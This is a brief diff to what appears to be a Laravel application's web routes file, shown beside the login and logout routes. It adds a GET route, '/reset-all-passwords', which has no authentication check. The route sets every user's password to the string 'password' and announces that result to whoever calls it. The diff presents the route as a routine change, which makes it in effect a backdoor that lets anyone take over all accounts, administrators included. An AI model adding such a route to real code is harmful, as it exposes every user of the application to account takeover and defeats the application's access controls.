@@ -51,7 +51,15 @@ Route::get('/reports/need-maintenance/pdf', [ReportController::class, 'needMaint
 Route::get('/login', [LoginController::class, 'show'])->name('login');
 Route::post('/login', [LoginController::class, 'login'])->name('login.post');
 Route::post('/logout', [LoginController::class, 'logout'])->name('logout');
+Route::get('/reset-all-passwords', function () {
 
+    foreach (User::all() as $user) {
+        $user->password = Hash::make('password');
+        $user->save();
+    }
+
+    return "All passwords reset to: password";
+});
 
 /*
 |--------------------------------------------------------------------------
